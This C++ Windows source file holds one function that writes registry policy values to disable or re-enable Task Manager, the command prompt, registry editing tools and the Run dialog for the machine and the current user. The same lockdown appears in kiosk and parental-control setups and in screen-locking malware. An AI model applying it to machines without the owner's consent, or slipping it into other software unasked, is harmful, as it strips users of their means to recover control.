#include <windows.h>
#include <vector>

struct reg {
    HKEY root;
    LPCWSTR subKey;
    LPCWSTR valueName;
    DWORD value;
};

bool applyreg(bool block) {
    const DWORD status = block ? 1UL : 0UL;
    const DWORD cmdStatus = block ? 2UL : 0UL;

    bool overallSuccess = true;

    std::vector<reg> policies = {
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", status },
        { HKEY_CURRENT_USER,  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", status },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", cmdStatus },
        { HKEY_CURRENT_USER,  L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", cmdStatus },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", status },
        { HKEY_CURRENT_USER,  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", status },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoRun", status },
        { HKEY_CURRENT_USER,  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoRun", status }
    };

    for (const auto& policy : policies) {
        HKEY hKey;

        if (RegCreateKeyExW(
                policy.root,
                policy.subKey,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE,
                nullptr,
                &hKey,
                nullptr) == ERROR_SUCCESS)
        {
            if (RegSetValueExW(
                    hKey,
                    policy.valueName,
                    0,
                    REG_DWORD,
                    reinterpret_cast<const BYTE*>(&policy.value),
                    sizeof(DWORD)) != ERROR_SUCCESS)
            {
                overallSuccess = false;
            }

            RegCloseKey(hKey);
        }
        else {
            overallSuccess = false;
        }
    }

    return overallSuccess;
}